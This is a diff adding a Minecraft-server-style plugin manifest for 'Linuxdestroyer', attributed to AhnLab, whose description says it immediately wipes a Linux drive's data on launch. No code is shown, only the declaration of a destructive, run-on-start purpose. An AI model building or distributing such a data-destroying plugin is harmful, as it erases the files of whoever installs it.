@@ -1,0 +1,6 @@
+name: Linuxdestroyer
+version: '${project.version}'
+main: ahnlab.linuxdestroyer.Linuxdestroyer
+api-version: 1.19
+authors: [ AhnLab ]
+description: A simple plugin that immediately removes the Data of a drive in Linux upon launch
